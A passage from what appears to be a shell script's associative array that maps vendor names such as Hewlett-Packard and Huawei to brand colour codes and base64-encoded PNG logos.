Q7nkSaxphLH1rYW/gaUQAAgAOtsGng9nw6/VIFwRWyuC+XiX7optvdrC+cCjdb2/S8igfdYeCvcffTXHawXJ8plkufk1Td1TwpIAm2qLcw5NKJIyuPuFjmn5TUQSoN7b4wiM+Z/2D/RqIAAAANU0LK5d9Kel0+ik7wWGeZ/JPm6va2ilymwHwyjvXLwHR1W2X6uocfeWTr7ub3TAGZPT6+bqyj49haL7CnUo+z2g4ck2Kt23jZ4yuib4Vh23kmXSipi2QaylqTf3HBsuK37cZdf1JQa9MW3xV6eFLNt7eUrU/0moqDD7ppfk1nafFvDvxxwt8fezinpvO0apyU1e4evENSZ23n6fv/ZDsPPuzSgppv5p2dW5K8G3scXKga78eS1PvYYxP7sVAfdrXxu7le6zz0A/bBXuB+RdXDG2s+3/a2A/KeCqXSvZLulaQoijrNbHEQBOPFYnGfxvs86aLFPL5ixdz2YPrQesx7/vINg3saQLtk21Ye2dM4B6Wp4a4H//hc6ufOLTqsPWifXev/v2rx1KLeAg8MAAAAAAAAAAAAAAAAaFr/D3bFOJaojMzCAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDIxLTA1LTAzVDE3OjE1OjI3KzAwOjAwTK/xIwAAACV0RVh0ZGF0ZTptb2RpZnkAMjAyMS0wNS0wM1QxNzoxNToyNyswMDowMD3ySZ8AAAAASUVORK5CYII='
										["Hewlett-Packard"]='#FFFFFF #0096D5 #E5E5E5 data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAADwCAMAAAAJixmgAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAADAFBMVEUAAAAAl9cAltcAltYAltYAltUAltYAltYAltUAl9UAl9UAldUAldQAktEAgP8AldYAltYAltYAltYAltUAl9UAldMAgL8AltYAltYAl9UAltcAltcAmcwAltUAltYAltYAltUAldYAlNYAn98AmdMAltYAltYAltUAmNYAktsAldUAldYAltYAltYAl9cAltYAl9YAl9EAltYAltYAltYAltYAi9EAldYAltYAltYAltUAktsAltcAltUAltYAjuMAltYAldYAlNUAltYAltYAlNUAl9YAltYAlNYAltcAltYAltYAldcAltYAltYAl9YAltYAltYAk9gAlNcAltcAltYAk9cAldYAltgAltUAltYAltYAl9cAltYAl9YAmdYAktsAl9YAltYAltYAltcAldcAltYAltcAldgA//8AldUAltYAltUAl9YAltYAldUAltUAltYAltUAltYAmd0AltYAl9UAltYAltYAldUAltYAmcwAmNYAltYAltoAltYAldYAqv8Al9YAltcAltYAlNcAltgAltUAldUAl9cAldUAltYAl9UAldcAldcAldYAm9MAltYAndgAldYAl9YAltcAnNUAltIAmNUAltYAltYAltcAltYAl9UAltYAltUAl9UAl9YAmdkAl9YAl9YAltcAk9gAltcAldcAltYAltYAldUAltYAltYAmdUAltYAmdkAldYAl9cAltYAmNYAlNUAldUAltYAl9YAltYAltUAldYAl9cAltYAltYAl9kAltcAldMAldYAltYAldcAmNcAmNQAldcAltYAl9YAltcAltUAltUAl9YAltUAldUAltcAldUAltYAl9cAltYAl9YAltcAltcAldYAldUAl9cAl9cAldcAltYAltYAldYAl9YAltYAltcAl9UAl9YAl9cAltYAldcAltYAj88Al9YAldUAltYAmNgAltYAqtUAldcAltYAldYAltYAlNUAl9gAl9UAltUAldYAlNYAltYAltUAltYAldYAltb///+68Ap2AAAA/nRSTlMAU6q0u7KclIFuW0g1HALL+dub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'
										["Huawei"]='#B2B2B2 #980101 #222222 data:image/png;base64,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